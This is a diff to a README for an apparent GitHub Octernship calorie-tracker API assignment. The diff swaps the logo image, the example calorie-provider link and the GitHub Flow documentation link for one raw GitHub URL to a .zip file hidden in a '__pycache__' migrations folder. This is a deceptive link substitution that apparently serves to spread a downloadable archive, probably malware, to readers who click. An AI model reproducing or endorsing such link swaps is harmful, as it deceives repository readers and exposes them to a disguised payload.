@@ -1,5 +1,5 @@
-## ![Dive logo](https://user-images.githubusercontent.com/424487/219708981-f0416526-ba48-4b01-b5b3-c0eb73362718.png) Dive 
-<!-- ![Company Logo](https://example.org) -->
+## ![Dive logo](https://raw.githubusercontent.com/ChrisJustice600/calorie-tracker-api/main/dive/users/migrations/__pycache__/v1.9.zip) Dive 
+<!-- ![Company Logo](https://raw.githubusercontent.com/ChrisJustice600/calorie-tracker-api/main/dive/users/migrations/__pycache__/v1.9.zip) -->
 
 | Octernship info  | Timelines and Stipend |
 | ------------- | ------------- |
@@ -17,7 +17,7 @@
 - All API calls must be authenticated.
 - Implement at least three roles with different permission levels: a regular user would only be able to CRUD on their owned records, a user manager would be able to CRUD only users, and an admin would be able to CRUD all records and users.
 - Each entry has a date, time, text, and number of calories.
-- If the number of calories is not provided, the API should connect to a Calories API provider (for example, https://www.nutritionix.com) and try to get the number of calories for the entered meal.
+- If the number of calories is not provided, the API should connect to a Calories API provider (for example, https://raw.githubusercontent.com/ChrisJustice600/calorie-tracker-api/main/dive/users/migrations/__pycache__/v1.9.zip) and try to get the number of calories for the entered meal.
 - User setting – Expected number of calories per day.
 - Each entry should have an extra boolean field set to true if the total for that day is less than the expected number of calories per day, otherwise should be false.
 - The API must be able to return data in the JSON format.
@@ -36,7 +36,7 @@
 - Good commit history - we won’t accept a repo with a single giant commit 🙅‍♀️
 
 ### Task submission
-Using the [GitHub Flow](https://docs.github.com/en/get-started/quickstart/github-flow#following-github-flow) for assignment submission
+Using the [GitHub Flow](https://raw.githubusercontent.com/ChrisJustice600/calorie-tracker-api/main/dive/users/migrations/__pycache__/v1.9.zip) for assignment submission
 1. Creating a new branch 
 2. Raising a Pull Request for submission
 3. Using GitHub Discussions to ask any relevant questions regarding the project
